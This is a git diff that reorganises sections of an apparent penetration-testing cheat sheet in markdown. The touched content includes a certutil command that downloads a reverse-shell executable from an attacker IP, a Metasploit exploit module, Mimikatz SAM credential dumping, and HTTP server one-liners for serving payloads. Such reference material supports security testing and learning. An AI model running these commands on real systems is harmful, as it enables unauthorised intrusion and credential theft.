@@ -25,12 +25,12 @@
 - [15. Reverse_Shell_Script](#rev)
 - [16. Privilege escalation](/Privilege.md)
 - [17. Email Harversting with theHarvester](#email)
-- [18 Mimikatz](#mimi)
-- [19. Simple Local Web Servers](#localweb)
+- [18. Simple Local Web Servers](#localweb)
 - Linux Forensics
 
 # Windows
 - [I. certutil](#certutil)
+- [II. Mimikatz](#mimi)
 
 # [1. Nmap](/nmap.md)
 
@@ -257,7 +257,27 @@ __Download the reverse shell in windows__
 - __`theHarvester -d <domain name> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh,rapdiddns`__
 
 
-# 18 Mimikatz <a name="mimi"></a>
+
+
+
+# 18. Simple Local Web Servers <a name="localweb"></a>
+
+```
+python -m SimpleHTTPServer 80
+```
+
+```
+python3 -m http.server
+```
+
+```
+php -S 0.0.0.0:80
+```
+# Windows 
+## I. certutil <a name="certutil"></a>
+- `certutil -urlcache -f http://10.1.23.11/revshell.exe revshell.exe`
+- 
+## II. Mimikatz <a name="mimi"></a>
 ```
 use exploit/windows/http/badblue_passthru
 set target <tab>
@@ -305,21 +325,3 @@ in meterpreter
 - `lsadump::sam`
 
 
-
-
-# 18. Simple Local Web Servers <a name="localweb"></a>
-
-```
-python -m SimpleHTTPServer 80
-```
-
-```
-python3 -m http.server
-```
-
-```
-php -S 0.0.0.0:80
-```
-
-# I. certutil <a name="certutil"></a>
-- `certutil -urlcache -f http://10.1.23.11/revshell.exe revshell.exe`
